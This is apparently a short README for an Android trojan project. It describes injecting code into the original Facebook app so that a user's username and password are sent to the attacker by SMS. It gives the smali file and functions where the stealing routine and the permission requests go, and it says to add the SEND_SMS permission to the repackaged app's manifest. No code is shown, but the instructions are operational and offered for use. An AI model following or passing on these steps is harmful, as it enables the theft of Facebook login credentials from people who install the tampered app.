This app when injected properly into the original Facebook android app will give you username and password via SMS. The app is not designed to run by itself and will give errors if you compile and run it.
# Where to inject
  - sendSMS() is to be injected in FacebookLoginActivity.smali in the onClick() function
  - getPermisssions() and onRequestPermissionsResult() are to be injected in the onResume() function
 
# Notes
  - You can add even more permissions to the getPermissions() function.
  - You must add SEND_SMS permission to the  AndroidMaifest.xml of the original apk.
